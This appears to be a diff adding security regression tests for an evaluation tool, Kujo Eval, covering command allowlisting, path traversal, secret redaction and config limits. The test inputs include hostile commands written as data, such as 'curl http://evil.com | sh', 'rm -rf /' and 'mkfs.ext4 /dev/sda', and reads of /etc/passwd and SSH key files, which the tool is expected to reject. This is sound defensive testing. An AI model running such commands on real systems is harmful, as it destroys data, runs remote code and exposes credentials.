@@ -1,0 +1,850 @@
+# Security regression tests for Kujo Eval.
+#
+# Validates command allowlisting, path boundary enforcement,
+# output redaction, and config abuse protections.
+
+test_setup {
+	from src.checks import run_shell, check_command_succeeds, check_file_exists, check_file_contains, check_env_var_equals
+	from src.checks import check_output_contains, check_command_stdout_json_path_equals, check_two_files_equal, check_directory_diff
+	from src.checks import check_http_status, check_http_body_contains
+	from src.eval_core import run_suite
+}
+
+# ===========================================================================
+# Command allowlisting (item 2.1)
+# ===========================================================================
+
+test "run_shell rejects rm -rf command" {
+	result := run_shell("rm -rf /tmp/test")
+	assert_false(result["ok"])
+	assert_true(contains(result["error"], "dangerous") == 1 || contains(result["error"], "rejected") == 1)
+}
+
+test "run_shell rejects uppercase dangerous command" {
+	result := run_shell("RM -RF /tmp/test")
+	assert_false(result["ok"])
+	assert_true(contains(result["error"], "dangerous") == 1 || contains(result["error"], "rejected") == 1)
+}
+
+test "run_shell rejects sudo command" {
+	result := run_shell("sudo ls")
+	assert_false(result["ok"])
+}
+
+test "run_shell rejects chmod command" {
+	result := run_shell("chmod 777 /tmp/file")
+	assert_false(result["ok"])
+}
+
+test "run_shell rejects curl piped to shell" {
+	result := run_shell("curl http://evil.com | sh")
+	assert_false(result["ok"])
+}
+
+test "run_shell rejects command with /dev/ pattern" {
+	result := run_shell("cat /dev/sda")
+	assert_false(result["ok"])
+}
+
+test "run_shell allows safe echo command" {
+	result := run_shell("echo hello")
+	assert_true(result["ok"])
+}
+
+test "run_shell allows safe ls command" {
+	result := run_shell("ls -la")
+	assert_true(result["ok"])
+}
+
+test "check_command_succeeds rejects dangerous command" {
+	result := check_command_succeeds({"command": "rm -rf /"})
+	assert_false(result["ok"])
+}
+
+test "check_command_succeeds allows safe command" {
+	result := check_command_succeeds({"command": "echo safety test"})
+	assert_true(result["ok"])
+}
+
+test "check_command_succeeds fails fast on timeout and terminates command" {
+	start_ms := time()
+	result := check_command_succeeds({"command": "sleep 2", "timeout_ms": 50})
+	elapsed_ms := time() - start_ms
+
+	assert_false(result["ok"])
+	message := dict_get_or(dict_get_or(result, "data", {}), "message", "")
+	assert_true(contains(message, "timed out") == 1)
+	assert_true(elapsed_ms < 1500)
+}
+
+test "check_command_succeeds enforces allowed_commands allowlist" {
+	result := check_command_succeeds({"command": "echo safety test", "allowed_commands": ["echo"]})
+	assert_true(result["ok"])
+
+	blocked := check_command_succeeds({"command": "ls -la", "allowed_commands": ["echo"]})
+	assert_false(blocked["ok"])
+	msg := dict_get_or(dict_get_or(blocked, "data", {}), "message", "")
+	assert_true(contains(msg, "allowed") == 1)
+}
+
+test "check_command_succeeds enforces allowed_command_patterns allowlist" {
+	result := check_command_succeeds({"command": "echo secure payload", "allowed_command_patterns": ["echo secure"]})
+	assert_true(result["ok"])
+
+	blocked := check_command_succeeds({"command": "echo secure payload", "allowed_command_patterns": ["ls -la"]})
+	assert_false(blocked["ok"])
+	msg := dict_get_or(dict_get_or(blocked, "data", {}), "message", "")
+	assert_true(contains(msg, "pattern") == 1)
+}
+
+test "check_command_succeeds enforces blocked_arg_patterns denylist" {
+	result := check_command_succeeds({"command": "echo hello world", "blocked_arg_patterns": ["--danger", "rm -rf"]})
+	assert_true(result["ok"])
+
+	blocked := check_command_succeeds({"command": "echo --danger world", "blocked_arg_patterns": ["--danger"]})
+	assert_false(blocked["ok"])
+	msg := dict_get_or(dict_get_or(blocked, "data", {}), "message", "")
+	assert_true(contains(msg, "blocked") == 1)
+}
+
+test "check_command_succeeds token mode avoids substring false positives" {
+	result := check_command_succeeds({"command": "echo-safe payload", "allowed_command_patterns": ["echo"], "command_pattern_match_mode": "token"})
+	assert_false(result["ok"])
+	msg := dict_get_or(dict_get_or(result, "data", {}), "message", "")
+	assert_true(contains(msg, "mode: token") == 1)
+
+	allowed := check_command_succeeds({"command": "echo payload", "allowed_command_patterns": ["echo"], "command_pattern_match_mode": "token"})
+	assert_true(allowed["ok"])
+}
+
+test "check_command_succeeds token mode applies blocked_arg_patterns by token sequence" {
+	allowed := check_command_succeeds({"command": "echo --dangerous", "blocked_arg_patterns": ["--danger"], "command_pattern_match_mode": "token"})
+	assert_true(allowed["ok"])
+
+	blocked := check_command_succeeds({"command": "echo --dangerous", "blocked_arg_patterns": ["--dangerous"], "command_pattern_match_mode": "token"})
+	assert_false(blocked["ok"])
+}
+
+test "run_suite threads suite-level allowed_commands into check execution" {
+	try {
+		write_file(".eval_allowed_commands_suite.json", "{\"name\":\"allowed-suite\",\"allowed_commands\":[\"echo\"],\"tests\":[{\"name\":\"allowed\",\"check\":\"command_succeeds\",\"params\":{\"command\":\"echo ok\"}},{\"name\":\"blocked\",\"check\":\"command_succeeds\",\"params\":{\"command\":\"ls\"}}]}")
+	} except err {}
+
+	results := run_suite(".eval_allowed_commands_suite.json", {"quiet": true})
+	data := dict_get_or(results, "data", {})
+	assert_true(results["ok"])
+	assert_equal(dict_get_or(data, "total", 0), 2)
+	assert_equal(dict_get_or(data, "passed", 0), 1)
+	assert_equal(dict_get_or(data, "failed", 0), 1)
+
+	try { remove_file(".eval_allowed_commands_suite.json") } except err {}
+}
+
+test "run_suite threads suite-level command pattern policies into check execution" {
+	try {
+		write_file(".eval_command_patterns_suite.json", "{\"name\":\"command-pattern-suite\",\"allowed_command_patterns\":[\"echo\"],\"blocked_arg_patterns\":[\"--blocked\"],\"tests\":[{\"name\":\"allowed\",\"check\":\"command_succeeds\",\"params\":{\"command\":\"echo ok\"}},{\"name\":\"blocked-arg\",\"check\":\"command_succeeds\",\"params\":{\"command\":\"echo --blocked\"}},{\"name\":\"blocked-pattern\",\"check\":\"command_succeeds\",\"params\":{\"command\":\"ls\"}}]}")
+	} except err {}
+
+	results := run_suite(".eval_command_patterns_suite.json", {"quiet": true})
+	data := dict_get_or(results, "data", {})
+	assert_true(results["ok"])
+	assert_equal(dict_get_or(data, "total", 0), 3)
+	assert_equal(dict_get_or(data, "passed", 0), 1)
+	assert_equal(dict_get_or(data, "failed", 0), 2)
+
+	try { remove_file(".eval_command_patterns_suite.json") } except err {}
+}
+
+test "validate_config applies strict-ci policy profile defaults" {
+	from src.config import validate_config
+
+	result := validate_config({
+		"name": "profile-defaults-suite",
+		"policy_profile": "strict-ci",
+		"tests": [{"name": "ok", "check": "command_succeeds", "params": {"command": "echo ok"}}]
+	})
+	assert_true(result["ok"])
+	data := dict_get_or(result, "data", {})
+	cfg := dict_get_or(data, "config", {})
+	assert_equal(dict_get_or(cfg, "policy_profile", ""), "strict-ci")
+	assert_equal(dict_get_or(cfg, "command_pattern_match_mode", "substring"), "token")
+	assert_true(dict_get_or(cfg, "redaction_audit_mode", false))
+	assert_true(len(dict_get_or(cfg, "allowed_commands", [])) > 0)
+}
+
+test "run_suite enforces strict-ci policy profile command defaults" {
+	try {
+		write_file(".eval_policy_profile_suite.json", "{\"name\":\"profile-suite\",\"policy_profile\":\"strict-ci\",\"tests\":[{\"name\":\"allowed\",\"check\":\"command_succeeds\",\"params\":{\"command\":\"echo ok\"}},{\"name\":\"blocked\",\"check\":\"command_succeeds\",\"params\":{\"command\":\"ls\"}}]}")
+	} except err {}
+
+	results := run_suite(".eval_policy_profile_suite.json", {"quiet": true})
+	data := dict_get_or(results, "data", {})
+	assert_true(results["ok"])
+	assert_equal(dict_get_or(data, "total", 0), 2)
+	assert_equal(dict_get_or(data, "passed", 0), 1)
+	assert_equal(dict_get_or(data, "failed", 0), 1)
+
+	try { remove_file(".eval_policy_profile_suite.json") } except err {}
+}
+
+test "validate_config normalizes policy_stage_overlays" {
+	from src.config import validate_config
+
+	result := validate_config({
+		"name": "stage-overlay-config-suite",
+		"policy_profile": "local-dev",
+		"policy_stage_overlays": {
+			"ci": {
+				"allowed_commands": ["echo"],
+				"command_pattern_match_mode": "token",
+				"redaction_audit_mode": true
+			}
+		},
+		"tests": [{"name": "ok", "check": "command_succeeds", "params": {"command": "echo ok"}}]
+	})
+	assert_true(result["ok"])
+	data := dict_get_or(result, "data", {})
+	cfg := dict_get_or(data, "config", {})
+	overlays := dict_get_or(cfg, "policy_stage_overlays", {})
+	ci_overlay := dict_get_or(overlays, "ci", {})
+	assert_equal(dict_get_or(ci_overlay, "command_pattern_match_mode", ""), "token")
+	assert_equal(len(dict_get_or(ci_overlay, "allowed_commands", [])), 1)
+	assert_true(dict_get_or(ci_overlay, "redaction_audit_mode", false))
+}
+
+test "run_suite applies policy_stage overlay precedence" {
+	try {
+		write_file(".eval_policy_stage_suite.json", "{\"name\":\"policy-stage-suite\",\"policy_profile\":\"local-dev\",\"policy_stage_overlays\":{\"ci\":{\"allowed_commands\":[\"echo\"]}},\"tests\":[{\"name\":\"stage-blocked\",\"check\":\"command_succeeds\",\"params\":{\"command\":\"ls\"}}]}")
+	} except err {}
+
+	default_results := run_suite(".eval_policy_stage_suite.json", {"quiet": true})
+	default_data := dict_get_or(default_results, "data", {})
+	assert_true(default_results["ok"])
+	assert_equal(dict_get_or(default_data, "passed", 0), 1)
+
+	ci_results := run_suite(".eval_policy_stage_suite.json", {"quiet": true, "policy_stage": "ci"})
+	ci_data := dict_get_or(ci_results, "data", {})
+	assert_true(ci_results["ok"])
+	assert_equal(dict_get_or(ci_data, "failed", 0), 1)
+	assert_equal(dict_get_or(ci_data, "active_policy_stage", ""), "ci")
+
+	try { remove_file(".eval_policy_stage_suite.json") } except err {}
+}
+
+test "check_http_status enforces blocked_http_hosts denylist" {
+	result := check_http_status({
+		"url": "https://example.com/health",
+		"expected_status": 200,
+		"blocked_http_hosts": ["example.com"]
+	})
+	assert_false(result["ok"])
+	message := dict_get_or(dict_get_or(result, "data", {}), "message", "")
+	assert_true(contains(message, "blocked") == 1)
+}
+
+test "check_http_status enforces allowed_http_hosts allowlist" {
+	result := check_http_status({
+		"url": "https://example.com/health",
+		"expected_status": 200,
+		"allowed_http_hosts": ["internal.example.com"]
+	})
+	assert_false(result["ok"])
+	message := dict_get_or(dict_get_or(result, "data", {}), "message", "")
+	assert_true(contains(message, "allowlisted") == 1)
+}
+
+test "check_http_body_contains applies blocked precedence over allowed hosts" {
+	result := check_http_body_contains({
+		"url": "https://example.com/health",
+		"expected": "ok",
+		"allowed_http_hosts": ["example.com"],
+		"blocked_http_hosts": ["example.com"]
+	})
+	assert_false(result["ok"])
+	message := dict_get_or(dict_get_or(result, "data", {}), "message", "")
+	assert_true(contains(message, "blocked") == 1)
+}
+
+test "run_suite threads suite-level blocked_http_hosts into HTTP checks" {
+	try {
+		write_file(".eval_http_host_policy_suite.json", "{\"name\":\"http-host-policy-suite\",\"blocked_http_hosts\":[\"example.com\"],\"tests\":[{\"name\":\"blocked-http\",\"check\":\"http_status\",\"params\":{\"url\":\"https://example.com/health\",\"expected_status\":200}}]}")
+	} except err {}
+
+	results := run_suite(".eval_http_host_policy_suite.json", {"quiet": true})
+	data := dict_get_or(results, "data", {})
+	assert_true(results["ok"])
+	assert_equal(dict_get_or(data, "failed", 0), 1)
+
+	entries := dict_get_or(data, "test_results", [])
+	if len(entries) > 0 {
+		first := entries[0]
+		msg := dict_get_or(first, "message", "")
+		assert_true(contains(msg, "blocked") == 1)
+	}
+
+	try { remove_file(".eval_http_host_policy_suite.json") } except err {}
+}
+
+test "validate_config normalizes require_command_policy controls" {
+	from src.config import validate_config
+
+	result := validate_config({
+		"name": "strict-policy-config-suite",
+		"require_command_policy": true,
+		"policy_stage_overlays": {
+			"ci": {
+				"require_command_policy": true,
+				"allowed_commands": ["echo"]
+			}
+		},
+		"tests": [{"name": "ok", "check": "command_succeeds", "params": {"command": "echo ok"}}]
+	})
+	assert_true(result["ok"])
+	data := dict_get_or(result, "data", {})
+	cfg := dict_get_or(data, "config", {})
+	overlays := dict_get_or(cfg, "policy_stage_overlays", {})
+	ci_overlay := dict_get_or(overlays, "ci", {})
+	assert_true(dict_get_or(cfg, "require_command_policy", false))
+	assert_true(dict_get_or(ci_overlay, "require_command_policy", false))
+}
+
+test "run_suite strict command mode fails closed in ci stage without allowlist" {
+	try {
+		write_file(".eval_strict_command_policy_fail.json", "{\"name\":\"strict-command-policy-fail\",\"policy_profile\":\"local-dev\",\"policy_stage_overlays\":{\"ci\":{\"require_command_policy\":true}},\"tests\":[{\"name\":\"command-check\",\"check\":\"command_succeeds\",\"params\":{\"command\":\"echo ok\"}}]}")
+	} except err {}
+
+	result := run_suite(".eval_strict_command_policy_fail.json", {"quiet": true, "policy_stage": "ci"})
+	assert_false(result["ok"])
+	assert_true(contains(dict_get_or(result, "error", ""), "Strict command policy") == 1)
+
+	try { remove_file(".eval_strict_command_policy_fail.json") } except err {}
+}
+
+test "run_suite strict command mode allows ci stage when allowlist is present" {
+	try {
+		write_file(".eval_strict_command_policy_pass.json", "{\"name\":\"strict-command-policy-pass\",\"policy_profile\":\"local-dev\",\"policy_stage_overlays\":{\"ci\":{\"require_command_policy\":true,\"allowed_commands\":[\"echo\"]}},\"tests\":[{\"name\":\"command-check\",\"check\":\"command_succeeds\",\"params\":{\"command\":\"echo ok\"}}]}")
+	} except err {}
+
+	result := run_suite(".eval_strict_command_policy_pass.json", {"quiet": true, "policy_stage": "ci"})
+	data := dict_get_or(result, "data", {})
+	assert_true(result["ok"])
+	assert_equal(dict_get_or(data, "passed", 0), 1)
+
+	try { remove_file(".eval_strict_command_policy_pass.json") } except err {}
+}
+
+test "run_suite threads suite-level command_pattern_match_mode into check execution" {
+	try {
+		write_file(".eval_command_pattern_mode_suite.json", "{\"name\":\"command-pattern-mode-suite\",\"command_pattern_match_mode\":\"token\",\"allowed_command_patterns\":[\"echo\"],\"tests\":[{\"name\":\"token-pass\",\"check\":\"command_succeeds\",\"params\":{\"command\":\"echo ok\"}},{\"name\":\"token-fail\",\"check\":\"command_succeeds\",\"params\":{\"command\":\"echo-safe\"}}]}")
+	} except err {}
+
+	results := run_suite(".eval_command_pattern_mode_suite.json", {"quiet": true})
+	data := dict_get_or(results, "data", {})
+	assert_true(results["ok"])
+	assert_equal(dict_get_or(data, "total", 0), 2)
+	assert_equal(dict_get_or(data, "passed", 0), 1)
+	assert_equal(dict_get_or(data, "failed", 0), 1)
+
+	try { remove_file(".eval_command_pattern_mode_suite.json") } except err {}
+}
+
+test "run_suite applies suite timeout_seconds to output checks" {
+	try {
+		write_file(".eval_suite_timeout_output.json", "{\"name\":\"suite-timeout-output\",\"timeout_seconds\":1,\"tests\":[{\"name\":\"slow-output\",\"check\":\"output_contains\",\"params\":{\"command\":\"sleep 2 && echo done\",\"expected\":\"done\"}}]}")
+	} except err {}
+
+	results := run_suite(".eval_suite_timeout_output.json", {"quiet": true})
+	data := dict_get_or(results, "data", {})
+	test_results := dict_get_or(data, "test_results", [])
+	first := {}
+	if len(test_results) > 0 {
+		first = test_results[0]
+	}
+	message := dict_get_or(first, "message", "")
+
+	assert_true(results["ok"])
+	assert_equal(dict_get_or(data, "failed", 0), 1)
+	assert_true(contains(message, "timed out") == 1)
+
+	try { remove_file(".eval_suite_timeout_output.json") } except err {}
+}
+
+# ===========================================================================
+# Path boundary enforcement (item 2.2)
+# ===========================================================================
+
+test "check_file_exists rejects path with .. traversal" {
+	result := check_file_exists({"path": "../etc/passwd"})
+	assert_false(result["ok"])
+	sec_msg := dict_get_or(dict_get_or(result, "data", {}), "message", "")
+	assert_true(contains(sec_msg, "rejected") == 1 || contains(sec_msg, "traversal") == 1)
+}
+
+test "check_file_exists rejects system directory path" {
+	result := check_file_exists({"path": "/etc/passwd"})
+	assert_false(result["ok"])
+}
+
+test "check_file_exists allows safe relative path" {
+	result := check_file_exists({"path": "kennel.toml"})
+	assert_true(result["ok"])
+}
+
+test "check_file_contains rejects path traversal" {
+	result := check_file_contains({"path": "../../root/.ssh/id_rsa", "expected": "key"})
+	assert_false(result["ok"])
+}
+
+test "check_file_contains allows safe file read" {
+	try {
+		write_file(".eval_sec_test.txt", "safe content")
+	} except err {}
+	result := check_file_contains({"path": ".eval_sec_test.txt", "expected": "safe"})
+	assert_true(result["ok"])
+	try {
+		remove_file(".eval_sec_test.txt")
+	} except err {}
+}
+
+test "check_file_exists enforces allowed_paths allowlist" {
+	try {
+		create_dir(".eval_allowed_paths")
+		write_file(".eval_allowed_paths/ok.txt", "ok")
+	} except err {}
+
+	allowed := check_file_exists({"path": ".eval_allowed_paths/ok.txt", "allowed_paths": [".eval_allowed_paths/"]})
+	assert_true(allowed["ok"])
+
+	blocked := check_file_exists({"path": "kennel.toml", "allowed_paths": [".eval_allowed_paths/"]})
+	assert_false(blocked["ok"])
+
+	try {
+		remove_file(".eval_allowed_paths/ok.txt")
+		remove_file(".eval_allowed_paths")
+	} except err {}
+}
+
+test "check_file_exists rejects symlink escape outside allowed_paths" {
+	try {
+		create_dir(".eval_symlink_allowed")
+		remove_file(".eval_symlink_allowed/link_outside")
+	} except err {}
+
+	link_cmd := run_shell("ln -s ../README.md .eval_symlink_allowed/link_outside")
+	assert_true(link_cmd["ok"])
+
+	result := check_file_exists({"path": ".eval_symlink_allowed/link_outside", "allowed_paths": [".eval_symlink_allowed/"]})
+	assert_false(result["ok"])
+	msg := dict_get_or(dict_get_or(result, "data", {}), "message", "")
+	assert_true(contains(msg, "symlink") == 1 || contains(msg, "outside") == 1 || contains(msg, "allowed") == 1)
+
+	try {
+		remove_file(".eval_symlink_allowed/link_outside")
+		remove_file(".eval_symlink_allowed")
+	} except err {}
+}
+
+test "check_file_contains rejects symlink escape outside allowed_paths" {
+	try {
+		create_dir(".eval_symlink_content")
+		remove_file(".eval_symlink_content/link_outside")
+	} except err {}
+
+	link_cmd := run_shell("ln -s ../README.md .eval_symlink_content/link_outside")
+	assert_true(link_cmd["ok"])
+
+	result := check_file_contains({"path": ".eval_symlink_content/link_outside", "expected": "Kujo", "allowed_paths": [".eval_symlink_content/"]})
+	assert_false(result["ok"])
+	msg := dict_get_or(dict_get_or(result, "data", {}), "message", "")
+	assert_true(contains(msg, "symlink") == 1 || contains(msg, "outside") == 1 || contains(msg, "allowed") == 1)
+
+	try {
+		remove_file(".eval_symlink_content/link_outside")
+		remove_file(".eval_symlink_content")
+	} except err {}
+}
+
+test "check_file_exists normalizes candidate and allowed paths before allowlist checks" {
+	try {
+		create_dir(".eval_allowed_paths_norm")
+		write_file(".eval_allowed_paths_norm/ok.txt", "ok")
+	} except err {}
+
+	allowed := check_file_exists({"path": ".//.eval_allowed_paths_norm//ok.txt", "allowed_paths": ["./.eval_allowed_paths_norm///"]})
+	assert_true(allowed["ok"])
+
+	try {
+		remove_file(".eval_allowed_paths_norm/ok.txt")
+		remove_file(".eval_allowed_paths_norm")
+	} except err {}
+}
+
+test "check_file_exists treats ./ allowlist as workspace root" {
+	result := check_file_exists({"path": "README.md", "allowed_paths": ["./"]})
+	assert_true(result["ok"])
+}
+
+test "check_file_exists rejects normalized traversal segments" {
+	result := check_file_exists({"path": "./.eval_allowed_paths_norm/../kennel.toml", "allowed_paths": [".eval_allowed_paths_norm"]})
+	assert_false(result["ok"])
+	msg := dict_get_or(dict_get_or(result, "data", {}), "message", "")
+	assert_true(contains(msg, "traversal") == 1 || contains(msg, "rejected") == 1)
+}
+
+test "run_suite threads suite-level allowed_paths into file checks" {
+	try {
+		create_dir(".eval_allowed_paths_suite")
+		write_file(".eval_allowed_paths_suite/ok.txt", "ok")
+		write_file(".eval_allowed_paths_suite.json", "{\"name\":\"allowed-paths-suite\",\"allowed_paths\":[\".eval_allowed_paths_suite/\"],\"tests\":[{\"name\":\"allowed\",\"check\":\"file_exists\",\"params\":{\"path\":\".eval_allowed_paths_suite/ok.txt\"}},{\"name\":\"blocked\",\"check\":\"file_exists\",\"params\":{\"path\":\"kennel.toml\"}}]}")
+	} except err {}
+
+	results := run_suite(".eval_allowed_paths_suite.json", {"quiet": true})
+	data := dict_get_or(results, "data", {})
+	assert_true(results["ok"])
+	assert_equal(dict_get_or(data, "total", 0), 2)
+	assert_equal(dict_get_or(data, "passed", 0), 1)
+	assert_equal(dict_get_or(data, "failed", 0), 1)
+
+	try {
+		remove_file(".eval_allowed_paths_suite/ok.txt")
+		remove_file(".eval_allowed_paths_suite")
+		remove_file(".eval_allowed_paths_suite.json")
+	} except err {}
+}
+
+test "validate_config normalizes stage overlay path policy profile defaults" {
+	from src.config import validate_config
+
+	result := validate_config({
+		"name": "stage-path-profile-suite",
+		"policy_stage_overlays": {
+			"release": {}
+		},
+		"tests": [{"name": "readme", "check": "file_exists", "params": {"path": "README.md"}}]
+	})
+	assert_true(result["ok"])
+	data := dict_get_or(result, "data", {})
+	cfg := dict_get_or(data, "config", {})
+	overlays := dict_get_or(cfg, "policy_stage_overlays", {})
+	release_overlay := dict_get_or(overlays, "release", {})
+	assert_equal(dict_get_or(release_overlay, "path_policy_profile", ""), "release-deny-default")
+	assert_true(len(dict_get_or(release_overlay, "allowed_paths", [])) > 0)
+}
+
+test "run_suite release stage uses deny by default path profile" {
+	try {
+		write_file(".eval_release_path_profile_suite.json", "{\"name\":\"release-path-profile-suite\",\"policy_profile\":\"local-dev\",\"policy_stage_overlays\":{\"release\":{}},\"tests\":[{\"name\":\"readme\",\"check\":\"file_exists\",\"params\":{\"path\":\"README.md\"}}]}")
+	} except err {}
+
+	default_result := run_suite(".eval_release_path_profile_suite.json", {"quiet": true})
+	default_data := dict_get_or(default_result, "data", {})
+	assert_true(default_result["ok"])
+	assert_equal(dict_get_or(default_data, "passed", 0), 1)
+
+	release_result := run_suite(".eval_release_path_profile_suite.json", {"quiet": true, "policy_stage": "release"})
+	release_data := dict_get_or(release_result, "data", {})
+	assert_true(release_result["ok"])
+	assert_equal(dict_get_or(release_data, "failed", 0), 1)
+
+	try { remove_file(".eval_release_path_profile_suite.json") } except err {}
+}
+
+test "run_suite stage path profile overlay takes precedence over top level allowlist" {
+	try {
+		write_file(".eval_stage_path_precedence_suite.json", "{\"name\":\"stage-path-precedence-suite\",\"allowed_paths\":[\"./tests/\"],\"policy_stage_overlays\":{\"ci\":{\"path_policy_profile\":\"ci-restricted\"}},\"tests\":[{\"name\":\"readme\",\"check\":\"file_exists\",\"params\":{\"path\":\"README.md\"}}]}")
+	} except err {}
+
+	default_result := run_suite(".eval_stage_path_precedence_suite.json", {"quiet": true})
+	default_data := dict_get_or(default_result, "data", {})
+	assert_true(default_result["ok"])
+	assert_equal(dict_get_or(default_data, "failed", 0), 1)
+
+	ci_result := run_suite(".eval_stage_path_precedence_suite.json", {"quiet": true, "policy_stage": "ci"})
+	ci_data := dict_get_or(ci_result, "data", {})
+	assert_true(ci_result["ok"])
+	assert_equal(dict_get_or(ci_data, "passed", 0), 1)
+
+	try { remove_file(".eval_stage_path_precedence_suite.json") } except err {}
+}
+
+test "run_suite appends output and snapshot dirs to non-empty suite allowlist at runtime" {
+	try {
+		create_dir(".eval_runtime_paths")
+		write_file(".eval_runtime_paths/ok.txt", "ok")
+		write_file(".eval_runtime_paths_suite.json", "{\"name\":\"runtime-path-suite\",\"allowed_paths\":[\"./tests/\"],\"tests\":[{\"name\":\"output-allowed\",\"check\":\"file_exists\",\"params\":{\"path\":\".eval_runtime_paths/ok.txt\"}}]}")
+	} except err {}
+
+	results := run_suite(".eval_runtime_paths_suite.json", {"quiet": true, "output_dir_override": ".eval_runtime_paths", "snapshot_dir_override": ".eval_runtime_paths"})
+	data := dict_get_or(results, "data", {})
+	assert_true(results["ok"])
+	assert_equal(dict_get_or(data, "total", 0), 1)
+	assert_equal(dict_get_or(data, "passed", 0), 1)
+
+	try {
+		remove_file(".eval_runtime_paths/ok.txt")
+		remove_file(".eval_runtime_paths")
+		remove_file(".eval_runtime_paths_suite.json")
+	} except err {}
+}
+
+test "check_env_var_equals enforces allowed_env_vars allowlist" {
+	home_val := env("HOME")
+	allowed := check_env_var_equals({"name": "HOME", "expected": home_val, "allowed_env_vars": ["HOME"]})
+	assert_true(allowed["ok"])
+
+	blocked := check_env_var_equals({"name": "PATH", "expected": env("PATH"), "allowed_env_vars": ["HOME"]})
+	assert_false(blocked["ok"])
+	msg := dict_get_or(dict_get_or(blocked, "data", {}), "message", "")
+	assert_true(contains(msg, "allowed") == 1)
+}
+
+test "run_suite threads suite-level allowed_env_vars into env checks" {
+	try {
+		write_file(".eval_allowed_env_suite.json", "{\"name\":\"allowed-env-suite\",\"allowed_env_vars\":[\"HOME\"],\"tests\":[{\"name\":\"allowed\",\"check\":\"env_var_equals\",\"params\":{\"name\":\"HOME\",\"expected\":\"" + env("HOME") + "\"}},{\"name\":\"blocked\",\"check\":\"env_var_equals\",\"params\":{\"name\":\"PATH\",\"expected\":\"" + env("PATH") + "\"}}]}")
+	} except err {}
+
+	results := run_suite(".eval_allowed_env_suite.json", {"quiet": true})
+	data := dict_get_or(results, "data", {})
+	assert_true(results["ok"])
+	assert_equal(dict_get_or(data, "total", 0), 2)
+	assert_equal(dict_get_or(data, "passed", 0), 1)
+	assert_equal(dict_get_or(data, "failed", 0), 1)
+
+	try { remove_file(".eval_allowed_env_suite.json") } except err {}
+}
+
+test "check_json_matches_shape rejects system path" {
+	result := check_json_matches_shape({"path": "/var/log/system.log", "required_keys": ["test"]})
+	assert_false(result["ok"])
+}
+
+# ===========================================================================
+# Output redaction (item 2.3)
+# ===========================================================================
+
+test "run_shell redacts API key from output" {
+	result := run_shell("echo 'Authorization: Bearer sk-abc123secret'")
+	assert_true(result["ok"])
+	assert_true(contains(result["stdout"], "sk-abc123secret") == 0)
+}
+
+test "run_shell redacts password from output" {
+	result := run_shell("echo 'password=supersecret123'")
+	assert_true(result["ok"])
+	assert_true(contains(result["stdout"], "supersecret123") == 0)
+}
+
+test "run_shell preserves safe output" {
+	result := run_shell("echo 'all systems operational'")
+	assert_true(result["ok"])
+	assert_true(contains(result["stdout"], "operational") == 1)
+}
+
+# ===========================================================================
+# Config size/depth limits (item 2.4)
+# ===========================================================================
+
+test "validate_config rejects too many tests" {
+	from src.config import validate_config
+
+	many_tests := []
+	ti := 0
+	while ti < 1001 {
+		many_tests := push(many_tests, {"name": "t" + to_string(ti), "check": "file_exists", "params": {"path": "kennel.toml"}})
+		ti := ti + 1
+	}
+
+	result := validate_config({"name": "too-many", "tests": many_tests})
+	assert_false(result["ok"])
+	assert_true(contains(result["error"], "1000") == 1)
+}
+
+test "validate_config rejects oversized test name" {
+	from src.config import validate_config
+
+	long_name := ""
+	ni := 0
+	while ni < 10001 {
+		long_name = long_name + "x"
+		ni := ni + 1
+	}
+
+	result := validate_config({"name": "suite", "tests": [{"name": long_name, "check": "file_exists", "params": {"path": "kennel.toml"}}]})
+	assert_false(result["ok"])
+}
+
+# ===========================================================================
+# Additional security edge cases (item 8.3)
+# ===========================================================================
+
+test "run_shell rejects shutdown command" {
+	result := run_shell("shutdown now")
+	assert_false(result["ok"])
+}
+
+test "run_shell rejects mkfs command" {
+	result := run_shell("mkfs.ext4 /dev/sda")
+	assert_false(result["ok"])
+}
+
+test "check_file_exists rejects root path" {
+	result := check_file_exists({"path": "/root/.ssh/authorized_keys"})
+	assert_false(result["ok"])
+}
+
+test "check_file_contains rejects /etc/passwd access" {
+	result := check_file_contains({"path": "/etc/passwd", "expected": "root"})
+	assert_false(result["ok"])
+}
+
+test "run_shell redacts Bearer token from stderr" {
+	result := run_shell("echo 'Authorization: Bearer token123' >&2")
+	assert_true(result["ok"])
+	assert_true(contains(result["stderr"], "token123") == 0)
+}
+
+test "run_shell redacts token query pattern in stdout" {
+	result := run_shell("echo 'https://example.test?token=abcd1234'")
+	assert_true(result["ok"])
+	assert_true(contains(result["stdout"], "abcd1234") == 0)
+	assert_true(contains(result["stdout"], "REDACTED") == 1)
+}
+
+test "run_shell redacts api_key pattern in stdout" {
+	result := run_shell("echo 'api_key=supersecretkey'")
+	assert_true(result["ok"])
+	assert_true(contains(result["stdout"], "supersecretkey") == 0)
+	assert_true(contains(result["stdout"], "REDACTED") == 1)
+}
+
+test "check_output_contains redacts nested JSON token and api_key payloads" {
+	result := check_output_contains({"command": "echo '{\"auth\":{\"token\":\"ultraSecretToken\",\"api_key\":\"nestedApiKey\"}}'", "expected": "REDACTED", "redaction_audit_mode": true})
+	assert_true(result["ok"])
+	details := dict_get_or(dict_get_or(result, "data", {}), "details", {})
+	stdout_val := dict_get_or(details, "stdout", "")
+	assert_true(contains(stdout_val, "ultraSecretToken") == 0)
+	assert_true(contains(stdout_val, "nestedApiKey") == 0)
+	assert_true(contains(stdout_val, "REDACTED") == 1)
+	assert_true(dict_get_or(details, "redaction_hits", 0) > 0)
+	patterns := dict_get_or(details, "redaction_patterns", [])
+	assert_true(len(patterns) > 0)
+}
+
+test "check_output_contains emits redaction audit metadata when enabled" {
+	result := check_output_contains({"command": "echo 'token=abcd1234'", "expected": "REDACTED", "redaction_audit_mode": true})
+	assert_true(result["ok"])
+	details := dict_get_or(dict_get_or(result, "data", {}), "details", {})
+	assert_true(has_key(details, "redaction_hits") == 1)
+	assert_true(dict_get_or(details, "redaction_hits", 0) > 0)
+	patterns := dict_get_or(details, "redaction_patterns", [])
+	assert_true(len(patterns) > 0)
+}
+
+test "run_suite threads suite-level redaction_audit_mode into command checks" {
+	try {
+		write_file(".eval_redaction_audit_suite.json", "{\"name\":\"redaction-audit-suite\",\"redaction_audit_mode\":true,\"tests\":[{\"name\":\"audit\",\"check\":\"output_contains\",\"params\":{\"command\":\"echo token=abc\",\"expected\":\"REDACTED\"}}]}")
+	} except err {}
+
+	results := run_suite(".eval_redaction_audit_suite.json", {"quiet": true})
+	data := dict_get_or(results, "data", {})
+	assert_true(results["ok"])
+	test_results := dict_get_or(data, "test_results", [])
+	first := {}
+	if len(test_results) > 0 {
+		first = test_results[0]
+	}
+	details := dict_get_or(first, "details", {})
+	assert_true(has_key(details, "redaction_hits") == 1)
+
